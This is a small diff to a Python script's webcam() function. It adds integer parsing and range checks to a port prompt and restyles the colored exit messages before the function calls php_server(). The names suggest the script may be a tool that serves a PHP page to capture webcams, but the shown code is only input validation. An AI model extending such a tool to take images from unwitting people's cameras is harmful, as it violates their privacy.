@@ -73,10 +73,18 @@ def webcam():
     global port
 #====================================================================================================
     try:
-        port = input(Fore.MAGENTA + f"\r\nWhich Port Want To Open {Fore.GREEN}(Default 80){Fore.BLUE} : " + Fore.RESET)
+        port = int(input(Fore.MAGENTA + f"\r\nWhich Port Want To Open {Fore.GREEN}(Default 80){Fore.BLUE} : " + Fore.RESET))
     except KeyboardInterrupt:
-        exit(f"\r\n{Fore.RED}[-]{Fore.BLUE} User Exited :)")
-
+        exit(f"""\n{Fore.YELLOW}│
+╰┈➤{Fore.RED}[-]{Fore.BLUE} User Exited :)""")
+    except ValueError:
+        exit(f"""{Fore.YELLOW}│
+╰┈➤{Fore.RED}[-]{Fore.BLUE} Invalid Port !""")
+    if port > 65535:
+        exit(f"""{Fore.YELLOW}│
+╰┈➤{Fore.RED}[-]{Fore.BLUE} Port must be less than {Fore.GREEN}65536""" + Fore.RESET)
+    else:
+        pass
 #====================================================================================================
     php_server()
     
